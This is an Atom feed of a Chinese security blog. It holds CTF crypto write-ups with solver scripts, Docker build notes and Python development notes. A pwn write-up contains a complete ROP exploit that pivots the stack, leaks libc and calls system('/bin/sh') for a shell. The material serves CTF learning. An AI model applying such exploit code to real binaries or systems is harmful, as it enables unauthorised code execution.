<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>vagrant&#39;s blog</title>
  
  <subtitle>welcome</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bobpanda.github.io/"/>
  <updated>2020-09-01T03:06:39.226Z</updated>
  <id>https://bobpanda.github.io/</id>
  
  <author>
    <name>vagrant</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Writeup for Crypto challenges of GACTF 2020</title>
    <link href="https://bobpanda.github.io/2020/09/01/Writeup-for-Crypto-challenges-of-GACTF-2020/"/>
    <id>https://bobpanda.github.io/2020/09/01/Writeup-for-Crypto-challenges-of-GACTF-2020/</id>
    <published>2020-09-01T01:50:43.000Z</published>
    <updated>2020-09-01T03:06:39.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>GACTF算是新的XCTF分站赛，受北极星师傅邀请抽空打了这场比赛。最后团队总排名19名。很可惜这次比赛队友因故都没怎么认真做，不然是很有可能打进前十名的。星盟团队确实没有顶尖的密码手，因此这次比赛的crypto题目是相对简单的，这次本菜鸡也算是K了。</p><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="da-Vinci-after-rsa"><a href="#da-Vinci-after-rsa" class="headerlink" title="da Vinci after rsa"></a>da Vinci after rsa</h2><p>题目首先给了一个貌似RSA算法的公钥和密文。N在factordb.com上可以完全分解。当我们兴冲冲地去求解d时，发现求不出e的逆元。那么这样也就是老的开根+CRT套路了，比较好的算法是A-M-M算法。但是在开源数学软件Sagemath中，已经实现了模域的开根算法，所以我们直接调用Sage中的<code>roots()</code>方法就行。解出以后，解一个简单的移位密码达芬奇密码就获得了flag，达芬奇密码简单地说就是将斐波那契序列作移位而形成。</p><p>Exp：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">9749</span></span><br><span class="line">q = <span class="number">11237753507624591</span></span><br><span class="line">r = <span class="number">9127680453986244150392840833873266696712898279308227257525736684312919750469261</span></span><br><span class="line">n = <span class="number">999999999999999999999999999999999999999999999999989999999999999999999999999999999999999999999999999</span></span><br><span class="line"><span class="keyword">assert</span>(p*q*r==n)</span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">F1.&lt;y&gt; = PolynomialRing(Zmod(q))</span><br><span class="line">F2.&lt;z&gt; = PolynomialRing(Zmod(r))</span><br><span class="line">equation = <span class="string">&quot;x^5-421363015174981309103786520626603807427915973516427836319727073378790974986429057810159449046489151&quot;</span></span><br><span class="line">equationy = <span class="string">&quot;y^5-421363015174981309103786520626603807427915973516427836319727073378790974986429057810159449046489151&quot;</span></span><br><span class="line">equationz = <span class="string">&quot;z^5-421363015174981309103786520626603807427915973516427836319727073378790974986429057810159449046489151&quot;</span></span><br><span class="line">rootp = F(equation).roots()</span><br><span class="line">rootq = F1(equationy).roots()</span><br><span class="line">rootr = F2(equationz).roots()</span><br><span class="line">print(rootp[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">print(rootq)</span><br><span class="line">print(rootr)</span><br><span class="line"></span><br><span class="line">rootq=[(<span class="number">9898464751509789</span>, <span class="number">1</span>),</span><br><span class="line"> (<span class="number">8415400986072042</span>, <span class="number">1</span>),</span><br><span class="line"> (<span class="number">6537111956662153</span>, <span class="number">1</span>),</span><br><span class="line"> (<span class="number">6139772527803903</span>, <span class="number">1</span>),</span><br><span class="line"> (<span class="number">2722510300825886</span>, <span class="number">1</span>)]</span><br><span class="line">rootp =<span class="number">7361</span></span><br><span class="line">rootr=[(<span class="number">8499052407588078002885931765166137308397074232361087682974448633946350539292222</span>,</span><br><span class="line">  <span class="number">1</span>),</span><br><span class="line"> (<span class="number">5570877862584063114417410584640901580756179707042774516590562822938385811269597</span>,</span><br><span class="line">  <span class="number">1</span>),</span><br><span class="line"> (<span class="number">2816114411493328258682873357893989007684496552202823306045771363205185148674391</span>,</span><br><span class="line">  <span class="number">1</span>),</span><br><span class="line"> (<span class="number">1369135259891793292334345751773139388112378132927363770631732500241630990458667</span>,</span><br><span class="line">  <span class="number">1</span>),</span><br><span class="line"> (<span class="number">180966415225632465120208272366108475667934082405238808958048294287011243645</span>,</span><br><span class="line">  <span class="number">1</span>)]</span><br><span class="line">minn = n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rootq:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> rootr:</span><br><span class="line">        <span class="keyword">if</span> crt([rootp,i[<span class="number">0</span>],j[<span class="number">0</span>]],[p,q,r])&lt; minn:</span><br><span class="line">            minn = crt([rootp,i[<span class="number">0</span>],j[<span class="number">0</span>]],[p,q,r])</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">print(long_to_bytes(minn))</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="elgaml-rsa"><a href="#elgaml-rsa" class="headerlink" title="elgaml_rsa"></a>elgaml_rsa</h2><p>这个题一开始白给了secret，后来删了让你自己求……不过尽管让你自己求也是<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/elgamal-zh/">CTF-wiki</a>上的原题……这个原题我暂时先不写了，有空以后再补上。这个RSA中e不是素数，所以还是得用那套开根算法。这次使用了<code>nth_root()</code>方法，功能比<code>roots()</code>更专精一些，所以速度更快。</p><p>Exp：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c=<span class="number">255310806360822158306697936064463902328816816156848194779397173946813224291656351345682266227949792774097276485816149202739762582969208376195999403112665514848825884325279574067341653685838880693150001066940379902609411551128810484902428845412055387955258568610350610226605230048821754213270699317153844590496606931431733319116866235538921198147193538906156906954406577796507390570080177313707462469835954564824944706687157852157673146976402325057144745208116022973614795377968986322754779469798013426261911408914756488145211933799442123449261969392169406969410065018032795960230701484816708147958190769470879211953704222809883281592308316942052671516609231501663363123562942</span></span><br><span class="line">e=<span class="number">4758</span></span><br><span class="line">n = <span class="number">232087313537</span>^<span class="number">4</span>*<span class="number">653551912583</span>^<span class="number">15</span>*<span class="number">42044128297</span>^<span class="number">6</span>*<span class="number">802576647765917</span>^<span class="number">7</span>*<span class="number">104280142799213</span>^<span class="number">6</span>*<span class="number">22138874396255995367093123412542835139147</span>*<span class="number">13762465758315682081101120047311808273580676420732931921786988371226809960736779727880583811067</span>*<span class="number">6516832825116557981350931</span>*<span class="number">28079229001363</span>^<span class="number">3</span></span><br><span class="line">flag = long_to_bytes(min(mod(c,n).nth_root(e,all=<span class="literal">True</span>)))</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="what-r-the-noise"><a href="#what-r-the-noise" class="headerlink" title="what_r_the_noise"></a>what_r_the_noise</h2><p>白给题，请求五百次数据然后求平均值就可以了。<br>Exp：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rs = remote(<span class="string">&quot;124.71.145.165&quot;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">database = []</span><br><span class="line">T = <span class="number">500</span></span><br><span class="line">final = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">47</span>):</span><br><span class="line">    final.append(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(T):</span><br><span class="line">    log.success(str(i))</span><br><span class="line">    <span class="comment">#rs.recvuntil(&quot;:&quot;)</span></span><br><span class="line">    rs.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    ans = rs.recvline().strip()[<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    database.append(ans)</span><br><span class="line">log.success(database)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> database:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">47</span>):</span><br><span class="line">            final[j] += float(i[j])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">47</span>):</span><br><span class="line">    final[j] = chr(int(round(final[j]/T)+<span class="number">1</span>))</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(final)</span><br><span class="line"><span class="comment">#log.success(final)</span></span><br><span class="line">log.success(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="ezAES"><a href="#ezAES" class="headerlink" title="ezAES"></a>ezAES</h2><p>又是个白给题。题目给了key的前14位，爆破2位，就能获得key，复杂度仅为O(128*128)。题目给了最后一个分组的完整密文，爆破成功后，又能根据最后一个分组的密文，根据CBC模式的特点依次推算出之前所有分块的密文。这样解出所有的密文为<code>a884ed307a7af7b003e81c46b928b1a9233f21c19790307c1f0b551b296401114765763869a74c4d22538ad4489c6e094eea629633f4d9589791ac584817cdb1c70b38bbd268a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4</code>，然后根据第一个分组求解IV。</p><p>Exp：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">import</span> binascii, sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">KEYSIZE=<span class="number">16</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">message</span>):</span></span><br><span class="line">    p = (KEYSIZE - len(message) % KEYSIZE) * chr(KEYSIZE - len(message) % KEYSIZE)</span><br><span class="line">    <span class="keyword">return</span> message + p</span><br><span class="line">message = <span class="string">&#x27;AES CBC Mode is commonly used in data encryption. What do you know about it?&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;T0EyZaLRzQmNe2pd&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;a884ed307a7af7b003e81c46b928b1a9&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">middle = aes.decrypt(cipher)</span><br><span class="line">pl = pad(message)[:<span class="number">16</span>]</span><br><span class="line">print(pl)</span><br><span class="line">iv = strxor(pl, middle)</span><br><span class="line">print(iv.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">print(iv)</span><br></pre></td></tr></table></figure></p><h2 id="square"><a href="#square" class="headerlink" title="square"></a>square</h2><p>这题考点是佩尔方程。题目给了一个奇怪的等式，用平方和公式化简后得到$2y^2+3y+1 = 6x^2$。经过一通神奇的配方变换，等式化为$(4y+3)^2 - 48x^2 = 1$，即标准的pell方程形式。然后换元使用pell方程的递推求解式子求解，注意最后换元回最先的$x$和$y$时要注意$y \equiv 3 \pmod 4$。</p><p>佩尔方程递推式：</p><p>$x<em>k = x</em>{k-1}x<em>1 + ny</em>{k-1}y_1$</p><p>$y<em>k = x</em>{k-1}y<em>1 + y</em>{k-1}x_1$</p><p>Exp：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line">solvex = [<span class="number">7</span>]</span><br><span class="line">solvey = [<span class="number">1</span>]</span><br><span class="line">n = <span class="number">48</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;md5(str + &quot;</span>)</span><br><span class="line">    suffix = p.recv(<span class="number">4</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;== &quot;</span>)</span><br><span class="line">    cipher = p.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span>(len(cipher)==<span class="number">5</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((x + suffix).encode()).hexdigest()[<span class="number">0</span>:<span class="number">5</span>] ==  cipher, string.ascii_letters + string.digits, length=<span class="number">5</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Give me xxxxx:&quot;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">4</span>==<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    xk=solvex[<span class="number">-1</span>]*solvex[<span class="number">0</span>]+n*solvey[<span class="number">-1</span>]*solvey[<span class="number">0</span>]</span><br><span class="line">    yk=solvex[<span class="number">-1</span>]*solvey[<span class="number">0</span>]+solvey[<span class="number">-1</span>]*solvex[<span class="number">0</span>]</span><br><span class="line">    solvex.append(xk)</span><br><span class="line">    solvey.append(yk)</span><br><span class="line">ansx = []</span><br><span class="line">ansy = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(solvex)):</span><br><span class="line">    <span class="keyword">if</span> (valid(solvex[i])):</span><br><span class="line">        ansx.append(solvey[i])</span><br><span class="line">        ansy.append((solvex[i]<span class="number">-3</span>)//<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ansx)):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="number">6</span>*ansx[i]**<span class="number">2</span>==<span class="number">2</span>*ansy[i]**<span class="number">2</span>+<span class="number">3</span>*ansy[i]+<span class="number">1</span>)</span><br><span class="line">print(len(ansx))</span><br><span class="line">rs = remote(<span class="string">&quot;124.71.158.89&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">proof_of_work(rs)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    rs.recvuntil(<span class="string">&#x27;[&gt;] x:&#x27;</span>)</span><br><span class="line">    rs.sendline(str(ansx[i]))</span><br><span class="line">    rs.recvuntil(<span class="string">&#x27;[&gt;] y:&#x27;</span>)</span><br><span class="line">    rs.sendline(str(ansy[i]))</span><br><span class="line">rs.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h2><p>一个<a href="https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html">原题</a>，爱德华兹曲线。我个人的理解以后有空再补。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;GACTF算是新的XCTF分站赛，受北极星师傅邀请抽空打了这场比赛。最后团队总排名19名。很可惜这次比赛队友因故都没怎么认真做，不然是很有可
      
    
    </summary>
    
    
      <category term="crypto" scheme="https://bobpanda.github.io/categories/crypto/"/>
    
    
      <category term="writeup" scheme="https://bobpanda.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Ciscn Build 踩坑笔记</title>
    <link href="https://bobpanda.github.io/2020/08/31/Ciscn-Build-%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/"/>
    <id>https://bobpanda.github.io/2020/08/31/Ciscn-Build-%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/</id>
    <published>2020-08-31T14:30:56.000Z</published>
    <updated>2020-08-31T15:37:23.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Ciscn真是个坑爹比赛。各种无聊要求最多，承办方通过Build环节收题，还一大堆无理要求（比如在提供docker镜像的情况下要求压缩包小于150M），但是没办法人家是国字头，惹不起嘛。（x</p><h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="1-相关docker命令笔记"><a href="#1-相关docker命令笔记" class="headerlink" title="1.相关docker命令笔记"></a>1.相关docker命令笔记</h2><ol><li><p>从指定的Dockerfile构建docker image:<br><code>docker build -f Dockerfile .</code></p></li><li><p>查看当前的docker image列表：<br><code>docker image ls</code></p></li><li><p>查看当前的docker container列表：<br><code>docker container ls</code></p></li><li><p>查看当前的docker 运行情况：<br><code>docker ps</code></p></li><li><p>删除一个docker镜像：<br><code>docker rmi -f &lt;docker image id&gt;</code><br>注意如果该镜像已经被某些container使用，则需要加入<code>-f</code>指令强制全部删除。</p></li><li><p>从某一个docker镜像启动docker服务：<br><code>docker run -it -d -p 50002:22 -p 8888:8888 &lt;docker image id&gt;</code><br>注意这里的<code>-p</code>指令是将docker中的端口映射到宿主机端口上，如50002:22就是将docker内部的22端口映射到宿主机的50002端口上，这样连接宿主机的50002端口即相当于是使用了docker内部的SSH服务。</p></li><li><p>直接获得一个启动了的docker container 的shell：<br><code>docker exec -it &lt;docker container id&gt; /bin/bash</code></p></li><li><p>启动/关闭一个docker 容器：<br><code>docker start &lt;docker container id&gt;</code><br><code>docker stop &lt;docker container id&gt;</code></p></li><li><p>docker容器和宿主机文件拷贝传输：<br><code>docker cp PATH_outside &lt;docker container id&gt;:PATH_inside</code></p></li></ol><h2 id="2-相关dockerfile中的指令"><a href="#2-相关dockerfile中的指令" class="headerlink" title="2.相关dockerfile中的指令"></a>2.相关dockerfile中的指令</h2><ol><li><p><code>FROM</code> ：指以某个docker镜像为基础构建自己的docker镜像。如果该基础镜像已经存在本地，则直接使用，否则会从网上去Pull。在本次Build环节中我使用的镜像是<code>python:2-slim</code>。这个docker基础只有150M大小，除了提供一个基础的Python环境服务以外什么都不能做。</p></li><li><p><code>RUN</code>：指运行某些指定的bash命令。</p></li><li><p><code>COPY</code>：类似于<code>docker cp</code>命令，从外部环境中拷贝文件到docker中去。</p></li><li><p><code>EXPOSE</code>：暴露某些端口，如22。</p></li></ol><h2 id="3-踩坑日记"><a href="#3-踩坑日记" class="headerlink" title="3.踩坑日记"></a>3.踩坑日记</h2><p>说实话我一开始不知道500多M的docker镜像居然能被7z压缩成150M，真的一直在试图在那个slim的150M什么都没有的docker里面配环境，结果最终是没有成功，不过我还是打算在这里记录一些经验。</p><p>由于该环境没有编译器，<code>apt-get</code>功能也几乎报废，因此在安装pycrypto库时候，需要复制编译好的所有文件，包括动态链接库到docker 中Python的site-package中。但是这样还不行。发现from Crypto.Cipher import AES的时候报错from _AES import *错误，原因是动态链接库名字不对，需要将文件夹中所有的动态链接库名字都改成_AES.so，_DES.so之类。</p><p>装Open-SSH环境时候：需要先下载所有的deb包然后手动安装。命令如下：<br><code>apt-get download $(apt-rdepends openssh-server | grep -v &quot;^ &quot; | sed &#39;s/debconf-2.0/debconf/g&#39;)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Ciscn真是个坑爹比赛。各种无聊要求最多，承办方通过Build环节收题，还一大堆无理要求（比如在提供docker镜像的情况下要求压缩包小于
      
    
    </summary>
    
    
      <category term="Devops" scheme="https://bobpanda.github.io/categories/Devops/"/>
    
    
  </entry>
  
  <entry>
    <title>开发笔记</title>
    <link href="https://bobpanda.github.io/2020/08/09/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    <id>https://bobpanda.github.io/2020/08/09/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</id>
    <published>2020-08-09T04:15:29.000Z</published>
    <updated>2020-08-09T05:53:26.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下最近的开发过程中遇到的一些问题和解决办法。</p><h1 id="Python-静态方法问题"><a href="#Python-静态方法问题" class="headerlink" title="Python 静态方法问题"></a>Python 静态方法问题</h1><p>Python的类方法中，一旦某个方法被声明为静态方法，即加入了修饰符@staticmethod，该方法只能直接访问自己声明的一些变量，不能通过self指针访问类中的实例属性。</p><p>我使用了一个watchdog的轮子实现文件监控，按照文档样例覆写了父类中的on_any_event()方法，且需要使该方法成为静态方法。框架如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span>(<span class="params">FileSystemEventHandler</span>):</span></span><br><span class="line">    controller = <span class="literal">None</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_any_event</span>(<span class="params">event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.is_directory:</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">elif</span> event.event_type == <span class="string">&#x27;created&#x27;</span>:</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>其中，有一行语句需要访问调用该类的控制器controller，但是不能通过self.controller访问，需要采用<code>Handler.controller</code>这样的方法访问，同时在外部需要对该controller赋值。例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Handler.controller._model.alter_operation(sql)</span><br></pre></td></tr></table></figure></p><h1 id="子进程调用问题"><a href="#子进程调用问题" class="headerlink" title="子进程调用问题"></a>子进程调用问题</h1><h2 id="问题来源"><a href="#问题来源" class="headerlink" title="问题来源"></a>问题来源</h2><p>我生成了一个bash脚本，想要在Python程序运行过程中通过subprocess库执行这个shell脚本。于是我采用了<code>subprocess.Popen()</code>方法执行。大致情况如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&quot;import.sh&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;#!/bin/bash&quot;</span>)</span><br><span class="line">f.write(bashcmd)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">process = subprocess.run([<span class="string">&quot;chmod&quot;</span> ,<span class="string">&quot;+x&quot;</span>,<span class="string">&quot;import.sh&quot;</span>])</span><br><span class="line">subprocess.Popen([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&#x27;./import.sh&#x27;</span>])</span><br></pre></td></tr></table></figure><br>问题是，如果在Popen后没有其他的Python语句，该条语句能够正常执行，bash脚本运行正常，但是一旦在此条语句后加入任何的Python语句，如print()，该bash脚本都不能正常工作。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>这其实是个假的解决方案，留有隐患，因为我还不知道这个问题的机理，只是想办法绕过了它。绕过办法很简单，就是把原先写在<code>subprocess.Popen([&quot;/bin/bash&quot;,&#39;./import.sh&#39;])</code>这一行后的所有语句都等价地修改成bash脚本中的内容，这样使其成为最后的一行Python语句，能够正常执行。改天一定要搞清楚这里到底是怎么回事。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;记录一下最近的开发过程中遇到的一些问题和解决办法。&lt;/p&gt;
&lt;h1 id=&quot;Python-静态方法问题&quot;&gt;&lt;a href=&quot;#Python-
      
    
    </summary>
    
    
      <category term="Devops" scheme="https://bobpanda.github.io/categories/Devops/"/>
    
    
  </entry>
  
  <entry>
    <title>stack overflow review</title>
    <link href="https://bobpanda.github.io/2020/08/07/stack-overflow-review/"/>
    <id>https://bobpanda.github.io/2020/08/07/stack-overflow-review/</id>
    <published>2020-08-07T03:01:11.000Z</published>
    <updated>2020-08-07T03:58:32.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于某些众所周知的原因，最近得要把早已丢弃的pwn捡起来了，某些坑爹比赛密码手没人权（滑稽）。这次，先分析一个简单的栈指针劫持的栈溢出题。</p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>32位程序，首先checksec检查下保护，发现pie和canary都没有开启。<br>打开题目，发现漏洞函数vul_function()</p><p><img src= "/img/loading.gif" data-lazy-src="/img/1.png" width="50%" height="50%"></p><p>漏洞点也很明显，最后buf多读了一些，导致在栈上多溢出了0x20-0x18=8位，仅仅刚能够覆盖ebp指针和返回地址，因此不能直接在这里构造ROP链。但是，ELF在bss段初始化生成了一个全局的s，读s的时候可以读入较长的数据。因此利用方法就呼之欲出了，就是在s中先写入构造好的ROP链，然后劫持栈指针指向s的地址执行这些gadgets。</p><p>那么怎么劫持栈指针呢？在intel汇编中有一条指令：<strong>leave</strong>。这条语句约等价于<code>mov esp ebp; pop ebp;</code>。所以我们覆盖的ebp就选择bss段的某个地址，然后找到leave ret的gadget，返回地址覆盖为leave_ret，这样esp就被劫持到bss段了。注意leave指令最后会pop，使栈顶指针增加，因此覆盖的ebp应当是s的实际地址-4。</p><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><ol><li>第一轮ROP先泄露libc的基地址，计算出system地址等。</li><li>第二轮ROP直接调用system函数getshell。</li></ol><h3 id="Exploit："><a href="#Exploit：" class="headerlink" title="Exploit："></a>Exploit：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x08048513</span></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048511</span></span><br><span class="line"></span><br><span class="line">rs.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>) <span class="comment">#第一轮泄露write地址</span></span><br><span class="line">rs.send(payload)</span><br><span class="line"></span><br><span class="line">rs.recvuntil(<span class="string">&quot;to say?&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr<span class="number">-4</span>)+p32(leave_ret) <span class="comment">#劫持栈指针</span></span><br><span class="line">rs.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(rs.recv(<span class="number">4</span>))</span><br><span class="line">log.success(write_addr)</span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base = write_addr - libc_write</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh=libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">sh_addr = libc_base+libc_sh</span><br><span class="line">rs.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = p32(system_addr)+p32(main_addr) + p32(sh_addr) <span class="comment">#第二轮getshell</span></span><br><span class="line">rs.send(payload)</span><br><span class="line">rs.recvuntil(<span class="string">&quot;to say?&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr<span class="number">-4</span>)+p32(leave_ret)</span><br><span class="line">rs.send(payload2)</span><br><span class="line">rs.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;由于某些众所周知的原因，最近得要把早已丢弃的pwn捡起来了，某些坑爹比赛密码手没人权（滑稽）。这次，先分析一个简单的栈指针劫持的栈溢出题。&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://bobpanda.github.io/categories/pwn/"/>
    
    
      <category term="stack overflow" scheme="https://bobpanda.github.io/tags/stack-overflow/"/>
    
  </entry>
  
  <entry>
    <title>年中随笔</title>
    <link href="https://bobpanda.github.io/2020/08/05/%E5%B9%B4%E4%B8%AD%E9%9A%8F%E7%AC%94/"/>
    <id>https://bobpanda.github.io/2020/08/05/%E5%B9%B4%E4%B8%AD%E9%9A%8F%E7%AC%94/</id>
    <published>2020-08-05T04:48:39.000Z</published>
    <updated>2020-08-05T11:35:43.173Z</updated>
    
